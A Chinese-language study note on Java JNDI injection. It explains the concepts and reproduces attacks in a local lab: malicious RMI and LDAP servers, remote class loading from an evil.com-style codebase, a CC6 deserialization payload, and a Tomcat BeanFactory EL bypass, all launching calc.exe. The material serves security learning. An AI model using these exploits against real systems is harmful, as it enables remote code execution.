---
created: '21/11/18'
title: JNDI
tags:
  - java
  - java安全
---
# JNDI
## 参考文章
- https://paper.seebug.org/1091/
- https://xz.aliyun.com/t/10674
- https://www.cnblogs.com/wk-missQ1/p/13138720.html
- https://cloud.tencent.com/developer/article/1441354
## JNDI
JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。

### Naming Service
命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如RMI Registry就是使用的Naming Service。

### Directory Service
是一种特殊的Naming Service，它允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。

### JNDI概念
-   **原子名**是一个简单、基本、不可分割的组成部分
-   **绑定**是名称与对象的关联，每个绑定都有一个不同的原子名
-   **复合名**包含零个或多个原子名，即由多个绑定组成
-   **上下文**是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名
-   **命名系统**是一组关联的上下文
-   **名称空间**是命名系统中包含的所有名称
-   **初始上下文**是探索名称空间的起点
-   要获取初始上下文，需要使用初始上下文工厂

### JNDI的好处
JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的**JNDI动态协议转换**。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。

### JNDI示例
#### RMI
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
ctx.bind("refObj", new RefObject());

//通过名称查找对象
ctx.lookup("refObj");
```
#### LDAP
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
 "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

DirContext ctx = new InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```
#### JNDI动态协议转换
上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。

例如：
```java
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker-server/refObj");
//ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
//ctx.lookup("iiop://attacker-server/bar");
```

再如下面的：
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";
//通过名称查找对象
ctx.lookup(name);
```
即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换。

### JNDI注入起源
> **JNDI注入**是BlackHat 2016（USA）[@pentester](https://twitter.com/pwntester)的一个议题"[A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)"[9]提出的。

上面提到了`lookup()`方法如果参数被控制可能存在jndi注入的问题，实际上其他方法比如`InitialContext.rename()`、 `InitialContext.lookupLink()`最后也调用了`InitialContext.lookup()`。还有其他包装了JNDI的应用，例如`Apache's Shiro JndiTemplate`、`Spring's JndiTemplate`也会调用`InitialContext.lookup()`。


### JNDI攻击向量
-   RMI
-   LDAP
-   Serialized Object
-   JNDI Reference
-   Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）
-   Remote Location
-   CORBA
-   IOR
这里引用一张经典图片，以更好地说明jdk版本与攻击向量的选择:
![](https://gitee.com/guuest/images/raw/master/img/20220215122812.png)


#### JNDI Reference+RMI攻击
##### 限制条件
- JDK 6 <6u132
- JDK 7 < 7u122
- JDK 8 < 8u113
在这些版本之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。

##### 前置介绍


##### 攻击流程
在我们攻击流程中，我们需要使用到Reference类，其有几个比较关键的属性：
1.  className - 远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载
2.  classFactory - 远程的工厂类
3.  classFactoryLocation - 工厂类加载的地址，可以是各种协议，如http://

**参考代码如下:**
```java
Reference refObj = new Reference("refClassName", "FactoryClassName", "http://evil.com:8000/");//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名，http://evil.com:9999/是classFactoryLocation
ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
registry.bind("refObj", refObjWrapper);
```

**完整代码如下**:
客户端:
```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:9999/refObj");
    }
}
```
服务端:
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");
        Reference refObj = new Reference("ExportObject", "EvilClass", "http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}
```
恶意类:
```
import java.io.IOException;

public class EvilClass {
    public EvilClass() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException var1) {
            var1.printStackTrace();
        }

    }
}
```
**完整攻击流程**:
1. 编译EvilClass.java为EvilClass.class (`javac EvilClass.java`)
2. 运行恶意http server，挂载上述class(`python3 -m http.server 8000`)
3. 运行恶意rmi server(上面的RMIServer类)
4. 运行客户端发起请求(上面的RMIClient类)
5. 客户端对恶意RMI server发送请求，获取远程对象存根实例
6. 客户端会先从本地的`CLASSPATH`中寻找`ExportObject`，如果找不到，则从classFactoryLocation即`http://127.0.0.1:8000/EvilClass.class`中寻找工厂类
7. 客户端通过实例化工厂类获取真正的对象，工厂类中包含的恶意代码被执行

#### JNDI Reference+LDAP攻击
这里就不介绍ldap协议了，直接看如何攻击。
##### 限制条件
- JDK 6 < 6u211
- JDK 7 < 7u201
- JDK 8 < 8u191
- JDK 11 < 11.0.1
在这些版本之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被调整为false，对LDAP Reference远程工厂类的加载增加了限制。

##### 攻击流程
攻击流程与上面的JNDI Reference+RMI攻击类似。
**完整代码如下**(参考marshalsec项目):
客户端:
```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class LDAPClient {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup("ldap://127.0.0.1:7777/anything");
    }
}
```
服务端maven依赖:
```xml
<dependency>  
 <groupId>com.unboundid</groupId>  
 <artifactId>unboundid-ldapsdk</artifactId>  
 <version>6.0.0</version>  
</dependency>
```
服务端:
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8000/#EvilClass"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "ExportObject");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```
恶意类同上面的EvilClass.java

**完整攻击流程**:
1. 编译EvilClass.java为EvilClass.class (`javac EvilClass.java`)
2. 运行恶意http server，挂载上述class(`python3 -m http.server 8000`)
3. 运行恶意rmi server(上面的LDAPServer类)
4. 运行客户端发起请求(上面的LDAPClient类)
5. 客户端对恶意LDAP server发送请求，获取远程对象存根实例
6. 客户端会先从本地的`CLASSPATH`中寻找`ExportObject`，如果找不到，则从javaFactory即`http://127.0.0.1:8000/EvilClass.class`中寻找工厂类
7. 客户端通过实例化工厂类获取真正的对象，工厂类中包含的恶意代码被执行

#### SerializedData + LDAP攻击
这种攻击方法不受jdk版本的限制，但是要求目标存在可利用的java组件
##### 限制条件
客户端存在可利用的java组件

##### 前置介绍
LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。分析如下:
当客户端从服务器中获取到对象，进行解析时，`com.sun.jndi.ldap.Obj.decodeObject()`:
![](https://gitee.com/guuest/images/raw/master/img/20220214164257.png)
此时如果javaSerializedData不为空则进入第一个分支，先根据codebase判断使用哪个ClassLoader，这对于本地反序列化来说没有影响，接着跟进`deserializeObject()`:
![](https://gitee.com/guuest/images/raw/master/img/20220214164513.png)
这里直接将我们传入的javaSerializedData反序列化。


##### 攻击流程
**完整代码如下**:
客户端:
```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class LDAPClient {
    public static void main(String[] args) throws Exception {
        Context ctx = new InitialContext();
        ctx.lookup("ldap://127.0.0.1:7777/anything");
    }
}
```
客户端与服务端maven依赖:
```xml
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.1</version>  
</dependency>
```
服务端:
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static byte[] getPayload() throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        // 先使用fakeTransformer防止本地命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");

        Map objMap = new HashMap();
        objMap.put(tiedMapEntry, "valuevalue");
        outerMap.remove("keykey");

        // 使用反射替换transformerChain的transformers
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(objMap);
        oos.close();

        return barr.toByteArray();
    }
}
```
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

public class LDAPSerialServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8000/#EvilClass"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System.out.println("Send LDAP reference result for " + base + " return CC6 gadgets");
            e.addAttribute("javaClassName", "DeserPayload"); //$NON-NLS-1$
            e.addAttribute("javaSerializedData", CC6.getPayload());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

**完整攻击流程**:
1. 运行恶意ldap server(上面的LDAPSerialServer类)
2. 运行客户端发起请求(上面的LDAPClient类)
3. 客户端对恶意LDAP server发送请求，获取包含javaSerializedData属性的对象
4. 客户端解析对象，发现存在javaSerializedData属性，对其进行反序列化
5. 触发本地反序列化链

#### 本地 Factory
> 在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。

##### 限制条件
1. 客户端存在一个实现了`javax.naming.spi.ObjectFactory`接口且存在`getObjectInstance()`方法的类，如`org.apache.naming.factory.BeanFactory`
2. `getObjectInstance()`方法存在可以利用的逻辑(如`BeanFactory`可以实例化对象的beanClass)
    1. 在`BeanFactory`这个例子中，`getObjectInstance()`方法会实例化对象的beanClass。

其中，beanClass需要满足以下几个条件(通过分析`BeanFactory.getObjectInstance()`得出):
1. 本地classpath里存在
2. 具有无参构造方法
3. 有直接或间接执行代码的方法，并且方法只能传入一个字符串参数。

通过上述的描述，寻找到符合的类有:
1. tomcat8里的j`avax.el.ELProcessor#eval(String) `
2. springboot 1.2.x自带的`groovy.lang.GroovyShell#evaluate(String)`


##### 攻击流程
1. `Obj.decodeObject()`返回Reference对象
2. 接着会进入`NamingManager.getObjectFactoryFromReference()`，如果是Reference对象，则会返回一个ObjectFactory对象（这里实现类是BeanFactory）
3. 实例化beanClass后，会获取Reference对象里的forceString属性值 
4. 将属性值会以逗号和等号分割，格式如param1=methodName1,param2=methodName2
5. 接着会反射调用beanClass对象里名为methodName1的方法，并传入参数，限定参数类型为String，参数通过Reference对象里param1属性获取。
 
模拟攻击流程如下:
1. 搭建tomcat源码的测试环境(中文乱码问题参考[这里](https://cloud.tencent.com/developer/article/1441354))，这里注意要修改下pom.xml的依赖(网上搜索到的pom.xml会缺乏LDAPServer的依赖且easyMock的版本过低)，这是我使用的依赖
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

  <modelVersion>4.0.0</modelVersion>
  <groupId>org.apache</groupId>
  <artifactId>tomcat</artifactId>
  <name>apache-tomcat-8.5.75</name>
  <version>8.5.75</version>

  <build>
    <finalName>Tomcat-8.5.57</finalName>
    <sourceDirectory>java</sourceDirectory>
    <testSourceDirectory>test</testSourceDirectory>
    <resources>
      <resource>
        <directory>java</directory>
      </resource>
    </resources>
    <testResources>
      <testResource>
        <directory>test</directory>
      </testResource>
    </testResources>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.5.1</version>
        <configuration>
          <encoding>UTF-8</encoding>
          <source>1.8</source>
          <target>1.8</target>
        </configuration>
      </plugin>
    </plugins>
  </build>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.12</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>com.unboundid</groupId>
      <artifactId>unboundid-ldapsdk</artifactId>
      <version>6.0.0</version>
    </dependency>
    <dependency>
      <groupId>org.easymock</groupId>
      <artifactId>easymock</artifactId>
      <version>4.3</version>
      <scope>test</scope>
    </dependency>

    <dependency>
      <groupId>org.apache.ant</groupId>
      <artifactId>ant</artifactId>
      <version>1.10.0</version>
    </dependency>
    <dependency>
      <groupId>wsdl4j</groupId>
      <artifactId>wsdl4j</artifactId>
      <version>1.6.2</version>
    </dependency>
    <dependency>
      <groupId>javax.xml</groupId>
      <artifactId>jaxrpc</artifactId>
      <version>1.1</version>
    </dependency>
    <dependency>
      <groupId>org.eclipse.jdt.core.compiler</groupId>
      <artifactId>ecj</artifactId>
      <version>4.6.1</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.glassfish/javax.xml.rpc -->
    <dependency>
      <groupId>org.glassfish</groupId>
      <artifactId>javax.xml.rpc</artifactId>
      <version>3.0.1-b03</version>
    </dependency>

  </dependencies>
</project>
```
2. 在创建java/exp文件夹并写入RMILocalFactoryServer.java:
```java
package exp;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMILocalFactoryServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(9999);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
        ref.add(new StringRefAddr("KINGX", "''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc.exe')"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);

        System.out.println("java LocalFactory RMI registry created. port on 9999...");
    }
}
```
3. 在web/ROOT中写入client.jsp:
```
<%@ page import="javax.naming.*" %>
<%@ page import="javax.el.ELProcessor" %>

<%
    try {
        Context ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:9999/Exploit");
    } catch (NamingException e) {
        e.printStackTrace();
    }
%>
```
4. 运行RMILocalFactoryServer
5. 运行tomcat服务器，访问http://127.0.0.1:8080/client.jsp，触发任意java代码执行

#### 总结
根据目标不同的jdk版本选择不同的攻击方式。
![](https://gitee.com/guuest/images/raw/master/img/20220215122812.png)